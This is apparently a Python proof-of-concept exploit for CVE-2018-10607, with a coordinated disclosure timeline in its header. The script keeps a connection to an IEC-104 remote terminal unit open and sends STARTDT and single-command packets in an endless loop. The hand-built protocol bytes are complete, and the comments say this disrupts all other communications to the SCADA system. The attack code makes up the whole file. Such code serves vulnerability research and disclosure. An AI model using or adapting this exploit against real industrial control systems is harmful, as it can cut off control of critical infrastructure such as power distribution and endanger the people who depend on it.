#!/usr/bin/python
# coding=utf-8
"""
CVE-2018-10607

IEC-104 communication error DoS
2018 Lockout

ATTACK PROOF-OF-CONCEPT CODE
UNSANCTIONED USE OF THE TOOL FORBIDDEN!

Licensed under MIT license (MIT)
Please see http://opensource.org/licekses/MIT for more details

DISCLOSURE:
26DEC2017 - Attack vector found
11JAN2018 - ICS-CERT notified
09FEB2018 - Vendor notified
07MAR2018 - Vulnerability coordination with ICS-CERT and Martem
31MAY2018 - Patch released
"""

__version__ = "0.0.1"
__author__ = "Lockout"
__year__ = "2018"

import socket
from time import sleep


IPaddress = ""
Port = 0

# Initiate a new connection to the RTU as it would be normally done, but this
# new connection would not be terminated, and would go in an endless loop.
s = socket.socket()
s.connect((IPaddress, Port))

while True:
    # STARTDT Act to establish the data transfer as expected for new control
    # channels
    START = b'\x68'                     # Startbyte = 0x68
    FRAME = b'\x07\x00\x00\x00'         # STARTDT Act
    ApduLen = b'\x04'                   # Payload length
    APCI = START + ApduLen + FRAME
    STARTDT = APCI
    s.sendall(STARTDT)
    s.recv(400)

    # Target the IOA to cause the DoS. Any other IOA or a group of those
    # can be used to casue the communication disruption.
    START = b'\x68'                     # Startbyte = 0x68
    ApduLen = b'\x0e'                   # Payload length
    Tx = b'\x00\x00'                    # Send sequence number. I-Fromat.
    Rx = b'\x00\x00'                    # Receive sequence number. I-Format.
    APCI = START + ApduLen + Tx + Rx

    TypeID = b'\x2d'                    # Type ID: C_SC_NA_1 Act
    opt = b'\x01\x06\x00'               # SQ,NumIx,CauseIx,Negative,Test,OA
    Addr = b'\x01\x00'                  # Addr
    IOA = b'\x65\x00\x00'
    SCO = b'\x00'                       # LSb: 0 = off, 1 = On
    ASDU = TypeID + opt + Addr + IOA + SCO

    APDU = APCI + ASDU
    s.sendall(APDU)
    s.recv(400)

    # Do not close the existing communication channel and continue sending the
    # SC Act control data.
    # This causes also all other existing ongoing communications to be
    # disrupted and triger 'communication error' message on SCADA system.
    sleep(1)
